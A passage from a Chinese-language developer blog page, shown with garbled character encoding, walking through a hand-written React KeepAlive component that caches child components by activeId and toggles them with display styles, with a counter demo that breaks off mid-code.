                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">React æ‰‹å†™å®ç°çš„ KeepAlive ç»„ä»¶ ğŸš€</h2>
<h3 data-id="heading-1">å¼•è¨€ ğŸ“</h3>
<p>åœ¨ React å¼€å‘ä¸­ï¼Œä½ æ˜¯å¦é‡åˆ°è¿‡è¿™æ ·çš„åœºæ™¯ï¼šåˆ‡æ¢ Tab é¡µé¢åï¼Œè¿”å›ä¹‹å‰çš„é¡µé¢ï¼Œè¾“å…¥çš„å†…å®¹ã€è®¡æ•°çŠ¶æ€å´ â€œæ¶ˆå¤±ä¸è§â€ äº†ï¼ŸğŸ¤” è¿™æ˜¯å› ä¸º React ç»„ä»¶é»˜è®¤åœ¨å¸è½½æ—¶ä¼šé”€æ¯çŠ¶æ€ï¼Œé‡æ–°æ¸²æŸ“æ—¶ä¼šåˆ›å»ºæ–°çš„å®ä¾‹ã€‚è€Œ <code>KeepAlive</code> ç»„ä»¶å°±åƒä¸€ä¸ª â€œçŠ¶æ€ä¿é²œç›’â€ï¼Œèƒ½è®©ç»„ä»¶åœ¨éšè—æ—¶ä¸å¸è½½ï¼Œä¿æŒåŸæœ‰çŠ¶æ€ï¼Œå†æ¬¡æ˜¾ç¤ºæ—¶ç›´æ¥å¤ç”¨ã€‚ä»Šå¤©æˆ‘ä»¬å°±ç»“åˆå®æˆ˜ä»£ç ï¼Œä»é›¶æ‹†è§£ <code>KeepAlive</code> ç»„ä»¶çš„å®ç°é€»è¾‘ï¼Œå¸¦ä½ åƒé€è¿™ä¸€å®ç”¨æŠ€èƒ½ï¼</p>
<h3 data-id="heading-2">ä¸€ã€ä»€ä¹ˆæ˜¯ Keep-Aliveï¼Ÿ ğŸ§©</h3>
<p><code>Keep-Alive</code> æºäº Vue çš„å†…ç½®ç»„ä»¶ï¼Œåœ¨ React ä¸­å¹¶æ²¡æœ‰åŸç”Ÿæ”¯æŒï¼Œä½†æä¾›äº†<strong>ç»„ä»¶ç¼“å­˜èƒ½åŠ›</strong>çš„ç¬¬ä¸‰æ–¹åº“<code>react-activation</code>,æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>import {KeepAlive} from 'react-activation';</code> å¯¼å…¥<code>KeepAlive</code>è·å¾—çŠ¶æ€ä¿å­˜èƒ½åŠ›ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬æ¥æ‰‹åŠ¨å®ç°å…¶æ ¸å¿ƒåŠŸèƒ½ï¼Œå®ƒæœ¬è´¨æ˜¯ä¸€ä¸ª<strong>ç»„ä»¶ç¼“å­˜å®¹å™¨</strong>ï¼Œæ ¸å¿ƒç‰¹æ€§å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç¼“å­˜ç»„ä»¶å®ä¾‹ï¼Œé¿å…ç»„ä»¶é¢‘ç¹æŒ‚è½½ / å¸è½½ï¼Œå‡å°‘æ€§èƒ½å¼€é”€ï¼›</li>
<li>ä¿æŒç»„ä»¶çŠ¶æ€ï¼ˆå¦‚ useState æ•°æ®ã€è¡¨å•è¾“å…¥å€¼ç­‰ï¼‰ï¼Œæå‡ç”¨æˆ·ä½“éªŒï¼›</li>
<li>é€šè¿‡ â€œæ˜¾éšæ§åˆ¶â€ æ›¿ä»£ â€œæŒ‚è½½ / å¸è½½â€ï¼Œç»„ä»¶å§‹ç»ˆå­˜åœ¨äº DOM ä¸­ï¼Œå¹¶æœªå¸è½½ï¼Œåªæ˜¯é€šè¿‡æ ·å¼éšè—ï¼›</li>
<li>æ”¯æŒä»¥å”¯ä¸€æ ‡è¯†ï¼ˆå¦‚ <code>activeId</code>ï¼‰ç®¡ç†å¤šä¸ªç»„ä»¶çš„ç¼“å­˜ä¸åˆ‡æ¢ã€‚</li>
</ul>
<p>ç®€å•è¯´ï¼Œ<code>Keep-Alive</code> å°±åƒç»™ç»„ä»¶ â€œå†¬çœ â€ çš„èƒ½åŠ› â€”â€” ä¸ç”¨æ—¶ä¼‘çœ ï¼ˆéšè—ï¼‰ï¼Œéœ€è¦æ—¶å”¤é†’ï¼ˆæ˜¾ç¤ºï¼‰ï¼ŒçŠ¶æ€å§‹ç»ˆä¸å˜ âœ¨ã€‚</p>
<h3 data-id="heading-3">äºŒã€ä¸ºä»€ä¹ˆéœ€è¦ Keep-Aliveï¼Ÿï¼ˆä½œç”¨ + åœºæ™¯ + ä½¿ç”¨ï¼‰ğŸŒŸ</h3>
<h4 data-id="heading-4">1. æ ¸å¿ƒä½œç”¨</h4>
<ul>
<li><strong>çŠ¶æ€ä¿ç•™</strong>ï¼šé¿å…ç»„ä»¶åˆ‡æ¢æ—¶ä¸¢å¤±ä¸´æ—¶çŠ¶æ€ï¼ˆå¦‚è¡¨å•è¾“å…¥ã€è®¡æ•°ã€æ»šåŠ¨ä½ç½®ï¼‰ï¼›</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šå‡å°‘é‡å¤æ¸²æŸ“å’Œç”Ÿå‘½å‘¨æœŸå‡½æ•°æ‰§è¡Œï¼ˆå¦‚ <code>useEffect</code> ä¸­çš„æ¥å£è¯·æ±‚ï¼‰ï¼›</li>
<li><strong>ä½“éªŒæå‡</strong>ï¼šåˆ‡æ¢ç»„ä»¶æ—¶æ— åŠ è½½å»¶è¿Ÿï¼Œæ“ä½œè¿è´¯æ€§æ›´å¼ºã€‚</li>
</ul>
<h4 data-id="heading-5">2. é€‚ç”¨åœºæ™¯</h4>
<ul>
<li><strong>Tab åˆ‡æ¢é¡µé¢</strong>ï¼šå¦‚åå°ç®¡ç†ç³»ç»Ÿçš„å¤šæ ‡ç­¾é¡µã€ç§»åŠ¨ç«¯çš„åº•éƒ¨å¯¼èˆªåˆ‡æ¢ï¼›</li>
<li><strong>è·¯ç”±è·³è½¬</strong>ï¼šåˆ—è¡¨é¡µè·³è½¬è¯¦æƒ…é¡µåè¿”å›ï¼Œä¿ç•™åˆ—è¡¨ç­›é€‰æ¡ä»¶å’Œæ»šåŠ¨ä½ç½®ï¼›</li>
<li><strong>é«˜é¢‘åˆ‡æ¢ç»„ä»¶</strong>ï¼šå¦‚è¡¨å•åˆ†æ­¥å¡«å†™ã€å¼¹çª—ä¸é¡µé¢çš„åˆ‡æ¢ï¼›</li>
<li><strong>èµ„æºå¯†é›†å‹ç»„ä»¶</strong>ï¼šå¦‚åŒ…å«å¤§é‡å›¾è¡¨ã€è§†é¢‘çš„ç»„ä»¶ï¼Œé¿å…é‡å¤åˆå§‹åŒ–ã€‚</li>
</ul>
<h4 data-id="heading-6">3. åŸºç¡€ä½¿ç”¨æ–¹å¼</h4>
<p>åœ¨æˆ‘ä»¬çš„å®æˆ˜ä»£ç ä¸­ï¼Œ<code>Keep-Alive</code> çš„ä½¿ç”¨éå¸¸ç®€æ´ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini">// çˆ¶ç»„ä»¶ä¸­åŒ…è£¹éœ€è¦ç¼“å­˜çš„ç»„ä»¶ï¼Œä¼ å…¥ activeId æ§åˆ¶æ¿€æ´»çŠ¶æ€
&lt;KeepAlive <span class="hljs-attr">activeId</span>={activeTab}&gt;
  {<span class="hljs-attr">activeTab</span> === <span class="hljs-string">'A'</span> ? &lt;Counter name=<span class="hljs-string">"A"</span> /&gt; : &lt;OtherCounter name=<span class="hljs-string">"B"</span> /&gt;}
&lt;/KeepAlive&gt;
</code></pre>
<ul>
<li><code>activeId</code>ï¼šå”¯ä¸€æ ‡è¯†ï¼Œç”¨äºåŒºåˆ†å½“å‰æ¿€æ´»çš„ç»„ä»¶ï¼›</li>
<li><code>children</code>ï¼šéœ€è¦ç¼“å­˜çš„ç»„ä»¶å®ä¾‹ï¼Œæ”¯æŒåŠ¨æ€åˆ‡æ¢ä¸åŒç»„ä»¶ã€‚</li>
</ul>
<h3 data-id="heading-7">ä¸‰ã€æ‰‹å†™ KeepAlive ç»„ä»¶çš„å®ç°æ€è·¯ ğŸ”</h3>
<h4 data-id="heading-8">1. æ ¸å¿ƒéœ€æ±‚åˆ†æ</h4>
<p>è¦å®ç°ä¸€ä¸ªé€šç”¨çš„ <code>Keep-Alive</code> ç»„ä»¶ï¼Œéœ€æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li>æ”¯æŒå¤šç»„ä»¶ç¼“å­˜ï¼šèƒ½åŒæ—¶ç¼“å­˜å¤šä¸ªç»„ä»¶ï¼Œé€šè¿‡ <code>activeId</code> åŒºåˆ†ï¼›</li>
<li>è‡ªåŠ¨æ›´æ–°ç¼“å­˜ï¼šæ–°ç»„ä»¶é¦–æ¬¡æ¿€æ´»æ—¶è‡ªåŠ¨å­˜å…¥ç¼“å­˜ï¼Œå·²ç¼“å­˜ç»„ä»¶ç›´æ¥å¤ç”¨ï¼›</li>
<li>çµæ´»æ§åˆ¶æ˜¾éšï¼šåªæ˜¾ç¤ºå½“å‰æ¿€æ´»çš„ç»„ä»¶ï¼Œå…¶ä½™ç»„ä»¶éšè—ï¼›</li>
<li>å…¼å®¹æ€§å¼ºï¼šä¸ä¾µå…¥å­ç»„ä»¶é€»è¾‘ï¼Œå­ç»„ä»¶æ— éœ€ä¿®æ”¹å³å¯ä½¿ç”¨ï¼›</li>
<li>çŠ¶æ€ç¨³å®šï¼šç¼“å­˜çš„ç»„ä»¶çŠ¶æ€ä¸ä¸¢å¤±ï¼Œç”Ÿå‘½å‘¨æœŸä¸é‡å¤æ‰§è¡Œã€‚</li>
</ul>
<h4 data-id="heading-9">2. å®ç°æ­¥éª¤æ‹†è§£ï¼ˆç»“åˆä»£ç è®²è§£ï¼‰</h4>
<p>åˆå§‹åŒ–ä¸€ä¸ª<code>React</code>é¡¹ç›®,é€‰æ‹©<code>JavaScript</code>è¯­è¨€ã€‚</p>
<p>æˆ‘ä»¬çš„ <code>KeepAlive</code> ç»„ä»¶ä»£ç ä½äº <code>src/components/KeepAlive.jsx</code>ï¼Œæ ¸å¿ƒåˆ†ä¸º 3 ä¸ªæ­¥éª¤ï¼Œä¸€æ­¥æ­¥æ‹†è§£å¦‚ä¸‹ï¼š</p>
<h5 data-id="heading-10">æ­¥éª¤ä¸€ï¼šå®šä¹‰ç¼“å­˜å®¹å™¨ ğŸ“¦</h5>
<p>æ ¸å¿ƒæ€è·¯ï¼šç”¨ React çš„ <code>useState</code> å®šä¹‰ä¸€ä¸ªç¼“å­˜å¯¹è±¡ <code>cache</code>ï¼Œä»¥ <code>activeId</code> ä¸º keyï¼Œç¼“å­˜å¯¹åº”çš„ç»„ä»¶å®ä¾‹ï¼ˆ<code>children</code>ï¼‰ã€‚</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">KeepAlive</span> = (<span class="hljs-params">{ activeId, children }</span>) =&gt; {
  <span class="hljs-comment">// å®šä¹‰ç¼“å­˜å®¹å™¨ï¼škey æ˜¯ activeIdï¼Œvalue æ˜¯å¯¹åº”çš„ç»„ä»¶å®ä¾‹ï¼ˆchildrenï¼‰</span>
  <span class="hljs-comment">// åˆå§‹å€¼ä¸ºç©ºå¯¹è±¡ï¼Œä¿è¯é¦–æ¬¡æ¸²æŸ“æ—¶æ— ç¼“å­˜ç»„ä»¶</span>
  <span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>({}); 

  <span class="hljs-comment">// åç»­é€»è¾‘...</span>
};
</code></pre>
<ul>
<li>ä¸ºä»€ä¹ˆç”¨å¯¹è±¡ä½œä¸ºç¼“å­˜å®¹å™¨ï¼Ÿå¯¹è±¡çš„ key æ”¯æŒå­—ç¬¦ä¸²ç±»å‹çš„ <code>activeId</code>ï¼ŒæŸ¥è¯¢å’Œä¿®æ”¹æ•ˆç‡é«˜ï¼ˆO (1)ï¼‰ï¼Œä¸”é…åˆ <code>Object.entries</code> æ–¹ä¾¿éå†ï¼›</li>
<li>Map ä¹Ÿå¯ä½œä¸ºç¼“å­˜å®¹å™¨ï¼ˆkey å¯æ”¯æŒå¯¹è±¡ç±»å‹ï¼‰ï¼Œä½†æœ¬ä¾‹ä¸­ <code>activeId</code> æ˜¯å­—ç¬¦ä¸²ï¼Œå¯¹è±¡è¶³å¤Ÿæ»¡è¶³éœ€æ±‚ï¼Œæ›´ç®€æ´ã€‚</li>
</ul>
<h5 data-id="heading-11">æ­¥éª¤äºŒï¼šç›‘å¬ä¾èµ–ï¼Œæ›´æ–°ç¼“å­˜ ğŸ”„</h5>
<p>æ ¸å¿ƒæ€è·¯ï¼šé€šè¿‡ <code>useEffect</code> ç›‘å¬ <code>activeId</code> å’Œ <code>children</code> çš„å˜åŒ–ï¼Œå½“åˆ‡æ¢ç»„ä»¶æ—¶ï¼Œè‹¥å½“å‰ <code>activeId</code> å¯¹åº”çš„ç»„ä»¶æœªè¢«ç¼“å­˜ï¼Œåˆ™å­˜å…¥ç¼“å­˜ã€‚</p>
<p>jsx</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">useEffect</span>(() =&gt; {
  <span class="hljs-comment">// é€»è¾‘ï¼šå¦‚æœå½“å‰ activeId å¯¹åº”çš„ç»„ä»¶æœªåœ¨ç¼“å­˜ä¸­ï¼Œå°±æ·»åŠ åˆ°ç¼“å­˜</span>
  if (!cache[activeId]) { 
    <span class="hljs-comment">// åˆ©ç”¨å‡½æ•°å¼æ›´æ–°ï¼Œç¡®ä¿æ‹¿åˆ°æœ€æ–°çš„ç¼“å­˜çŠ¶æ€ï¼ˆprev æ˜¯ä¸Šä¸€æ¬¡çš„ cacheï¼‰</span>
    <span class="hljs-built_in">setCache</span>((prev) =&gt; ({
      ...prev, // ä¿ç•™å·²æœ‰çš„ç¼“å­˜ç»„ä»¶
      [activeId]: children // æ–°å¢å½“å‰ activeId å¯¹åº”çš„ç»„ä»¶åˆ°ç¼“å­˜
    }))
  }
}, <span class="hljs-selector-attr">[activeId, children, cache]</span>); <span class="hljs-comment">// ä¾èµ–é¡¹ï¼šactiveId å˜äº†ã€ç»„ä»¶å˜äº†ã€ç¼“å­˜å˜äº†ï¼Œéƒ½è¦é‡æ–°æ£€æŸ¥</span>
</code></pre>
<ul>
<li>
<p>ä¾èµ–é¡¹è¯´æ˜ï¼š</p>
<ul>
<li><code>activeId</code>ï¼šåˆ‡æ¢æ ‡ç­¾æ—¶è§¦å‘ï¼Œæ£€æŸ¥æ–°æ ‡ç­¾å¯¹åº”çš„ç»„ä»¶æ˜¯å¦å·²ç¼“å­˜ï¼›</li>
<li><code>children</code>ï¼šè‹¥ä¼ å…¥çš„ç»„ä»¶å®ä¾‹å˜åŒ–ï¼ˆå¦‚ props æ”¹å˜ï¼‰ï¼Œéœ€è¦æ›´æ–°ç¼“å­˜ä¸­çš„ç»„ä»¶ï¼›</li>
<li><code>cache</code>ï¼šç¡®ä¿è·å–æœ€æ–°çš„ç¼“å­˜çŠ¶æ€ï¼Œé¿å…è¦†ç›–å·²æœ‰ç¼“å­˜ï¼›</li>
</ul>
</li>
<li>
<p>ä¸ºä»€ä¹ˆä¸ç›´æ¥ <code>setCache({...cache, [activeId]: children})</code>ï¼Ÿ å› ä¸º <code>cache</code> æ˜¯çŠ¶æ€ï¼Œç›´æ¥ä½¿ç”¨å¯èƒ½æ‹¿åˆ°æ—§å€¼ï¼Œå‡½æ•°å¼æ›´æ–°ï¼ˆ<code>prev =&gt; {...}</code>ï¼‰èƒ½ä¿è¯æ‹¿åˆ°æœ€æ–°çš„çŠ¶æ€ï¼Œé¿å…ç¼“å­˜ä¸¢å¤±ã€‚</p>
</li>
</ul>
<h5 data-id="heading-12">æ­¥éª¤ä¸‰ï¼šéå†ç¼“å­˜ï¼Œæ§åˆ¶ç»„ä»¶æ˜¾éš ğŸ­</h5>
<p>æ ¸å¿ƒæ€è·¯ï¼šé€šè¿‡ <code>Object.entries</code> å°†ç¼“å­˜å¯¹è±¡è½¬ä¸º <code>[key, value]</code> äºŒç»´æ•°ç»„ï¼Œéå†æ¸²æŸ“æ‰€æœ‰ç¼“å­˜ç»„ä»¶ï¼Œé€šè¿‡ <code>display</code> æ ·å¼æ§åˆ¶æ˜¾éšï¼ˆæ¿€æ´»çš„ç»„ä»¶æ˜¾ç¤ºï¼Œå…¶ä½™éšè—ï¼‰ã€‚</p>
<p>jsx</p>
<pre><code class="hljs language-css" lang="css">return (
  &lt;&gt;
    {
      // <span class="hljs-selector-tag">Object</span><span class="hljs-selector-class">.entries</span>(cache)ï¼šå°†ç¼“å­˜å¯¹è±¡è½¬ä¸ºäºŒç»´æ•°ç»„ï¼Œæ ¼å¼å¦‚ <span class="hljs-selector-attr">[[id1, component1]</span>, <span class="hljs-selector-attr">[id2, component2]</span>]
      <span class="hljs-selector-tag">Object</span><span class="hljs-selector-class">.entries</span>(cache)<span class="hljs-selector-class">.map</span>((<span class="hljs-selector-attr">[id, component]</span>) =&gt; (
        &lt;<span class="hljs-selector-tag">div</span> 
          key={id} // ç”¨ç¼“å­˜çš„ id ä½œä¸º keyï¼Œç¡®ä¿ React æ­£ç¡®è¯†åˆ«ç»„ä»¶
          // æ˜¾éšæ§åˆ¶ï¼šå½“å‰ id ç­‰äº activeId æ—¶æ˜¾ç¤ºï¼ˆblockï¼‰ï¼Œå¦åˆ™éšè—ï¼ˆ<span class="hljs-attribute">none</span>ï¼‰
          style={{ <span class="hljs-attribute">display</span>: id === activeId ? <span class="hljs-string">'block'</span> : <span class="hljs-string">'none'</span> }}
        &gt;
          {component} {<span class="hljs-comment">/* æ¸²æŸ“ç¼“å­˜çš„ç»„ä»¶å®ä¾‹ */</span>}
        &lt;/<span class="hljs-selector-tag">div</span>&gt;
      ))
    }
  &lt;/&gt;
);
</code></pre>
<ul>
<li>å…³é”®é€»è¾‘ï¼šæ‰€æœ‰ç¼“å­˜çš„ç»„ä»¶éƒ½ä¼šè¢«æ¸²æŸ“åˆ° DOM ä¸­ï¼Œä½†é€šè¿‡ <code>display: none</code> éšè—æœªæ¿€æ´»çš„ç»„ä»¶ï¼Œè¿™æ ·ç»„ä»¶ä¸ä¼šå¸è½½ï¼ŒçŠ¶æ€å¾—ä»¥ä¿ç•™ï¼›</li>
<li><code>key</code> çš„ä½œç”¨ï¼šå¿…é¡»ç”¨ <code>id</code> ä½œä¸º keyï¼Œé¿å… React è¯¯åˆ¤ç»„ä»¶èº«ä»½ï¼Œå¯¼è‡´çŠ¶æ€ä¸¢å¤±ã€‚</li>
</ul>
<h4 data-id="heading-13">3.å…³é”®é€»è¾‘æ‹†è§£</h4>
<h3 data-id="heading-14">å››ã€å®Œæ•´ä»£ç åŠæ•ˆæœæ¼”ç¤º ğŸ“¸</h3>
<h4 data-id="heading-15">1. å®Œæ•´ KeepAlive ç»„ä»¶ï¼ˆ<code>src/components/KeepAlive.jsx</code>ï¼‰</h4>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">/**
 * KeepAlive ç»„ä»¶ï¼šç¼“å­˜ React ç»„ä»¶ï¼Œé¿å…å¸è½½ï¼Œä¿æŒçŠ¶æ€
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">activeId</span> - å½“å‰æ¿€æ´»çš„ç»„ä»¶æ ‡è¯†ï¼ˆå”¯ä¸€keyï¼‰
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">React.ReactNode</span>} <span class="hljs-variable">children</span> - éœ€è¦ç¼“å­˜çš„ç»„ä»¶å®ä¾‹
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">JSX.Element</span>} æ¸²æŸ“æ‰€æœ‰ç¼“å­˜ç»„ä»¶ï¼Œæ§åˆ¶æ˜¾éš
 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">KeepAlive</span> = (<span class="hljs-params">{ activeId, children }</span>) =&gt; {
  <span class="hljs-comment">// ç¼“å­˜å®¹å™¨ï¼škey ä¸º activeIdï¼Œvalue ä¸ºå¯¹åº”çš„ç»„ä»¶å®ä¾‹</span>
  <span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>({});

  <span class="hljs-comment">// ç›‘å¬ activeIdã€childrenã€cache å˜åŒ–ï¼Œæ›´æ–°ç¼“å­˜</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// è‹¥å½“å‰ activeId å¯¹åº”çš„ç»„ä»¶æœªç¼“å­˜ï¼Œåˆ™æ·»åŠ åˆ°ç¼“å­˜</span>
    <span class="hljs-keyword">if</span> (!cache[activeId]) {
      <span class="hljs-comment">// å‡½æ•°å¼æ›´æ–°ï¼Œç¡®ä¿æ‹¿åˆ°æœ€æ–°çš„ç¼“å­˜çŠ¶æ€</span>
      <span class="hljs-title function_">setCache</span>(<span class="hljs-function">(<span class="hljs-params">prevCache</span>) =&gt;</span> ({
        ...prevCache, <span class="hljs-comment">// ä¿ç•™å·²æœ‰ç¼“å­˜</span>
        [activeId]: children <span class="hljs-comment">// æ–°å¢å½“å‰ç»„ä»¶åˆ°ç¼“å­˜</span>
      }));
    }
  }, [activeId, children, cache]);

  <span class="hljs-comment">// éå†ç¼“å­˜ï¼Œæ¸²æŸ“æ‰€æœ‰ç»„ä»¶ï¼Œé€šè¿‡ display æ§åˆ¶æ˜¾éš</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      {Object.entries(cache).map(([id, component]) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
          <span class="hljs-attr">key</span>=<span class="hljs-string">{id}</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
            <span class="hljs-attr">display:</span> <span class="hljs-attr">id</span> === <span class="hljs-string">activeId</span> ? '<span class="hljs-attr">block</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">none</span>',
          }}
        &gt;</span>
          {component}
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">KeepAlive</span>;
</code></pre>
<h4 data-id="heading-16">2. æ¨¡æ‹Ÿ Tab åˆ‡æ¢åœºæ™¯ï¼ˆ<code>src/App.jsx</code>ï¼‰</h4>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini">import { useState, useEffect } from 'react'<span class="hljs-comment">;</span>
import KeepAlive from './components/KeepAlive.jsx'<span class="hljs-comment">;</span>

// è®¡æ•°ç»„ä»¶ Aï¼šæ¼”ç¤ºçŠ¶æ€ä¿ç•™
const <span class="hljs-attr">Counter</span> = ({ name }) =&gt; {
  const <span class="hljs-section">[count, setCount]</span> = useState(0)<span class="hljs-comment">;</span>

  // æ¨¡æ‹Ÿç»„ä»¶æŒ‚è½½/å¸è½½ç”Ÿå‘½å‘¨æœŸ
  useEffect(() =&gt; {
    console.log(`âœ¨ ç»„ä»¶ ${name} æŒ‚è½½å®Œæˆ`)<span class="hljs-comment">;</span>
    return () =&gt; {
      console.log(`âŒ ç»„ä»¶ ${name} å¸è½½å®Œæˆ`)<span class="hljs-comment">;</span>
    }<span class="hljs-comment">;</span>
  }, <span class="hljs-section">[name]</span>)<span class="hljs-comment">;</span>

  return (
    &lt;div <span class="hljs-attr">style</span>={{ padding: <span class="hljs-string">'20px'</span>, border: <span class="hljs-string">'1px solid #646cff'</span>, borderRadius: <span class="hljs-string">'8px'</span>, margin: <span class="hljs-string">'10px 0'</span> }}&gt;
      &lt;h3 <span class="hljs-attr">style</span>={{ color: <span class="hljs-string">'#646cff'</span> }}&gt;{name} è§†å›¾&lt;/h3&gt;
      &lt;p&gt;å½“å‰è®¡æ•°ï¼š{count} ğŸ¯&lt;/p&gt;
      &lt;button <span class="hljs-attr">onClick</span>={() =&gt; setCount(count + <span class="hljs-number">1</span>)} style={{ marginRight: <span class="hljs-string">'10px'</span> }}&gt;+<span class="hljs-number">1</span>&lt;/button&gt;
      &lt;button <span class="hljs-attr">onClick</span>={() =&gt; setCount(<span class="hljs-number">0</span>)}&gt;é‡ç½®&lt;/button&gt;
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

// è®¡æ•°ç»„ä»¶ Bï¼šä¸ A åŠŸèƒ½ä¸€è‡´ï¼Œç”¨äºæ¨¡æ‹Ÿåˆ‡æ¢
const <span class="hljs-attr">OtherCounter</span> = ({ name }) =&gt; {
  const <span class="hljs-section">[count, setCount]</span> = useState(0)<span class="hljs-comment">;</span>

  useEffect(() =&gt; {
    console.log(`âœ¨ ç»„ä»¶ ${name} æŒ‚è½½å®Œæˆ`)<span class="hljs-comment">;</span>
    return () =&gt; {
      console.log(`âŒ ç»„ä»¶ ${name} å¸è½½å®Œæˆ`)<span class="hljs-comment">;</span>
    }<span class="hljs-comment">;</span>
  }, <span class="hljs-section">[name]</span>)<span class="hljs-comment">;</span>

  return (
    &lt;div <span class="hljs-attr">style</span>={{ padding: <span class="hljs-string">'20px'</span>, border: <span class="hljs-string">'1px solid #535bf2'</span>, borderRadius: <span class="hljs-string">'8px'</span>, margin: <span class="hljs-string">'10px 0'</span> }}&gt;
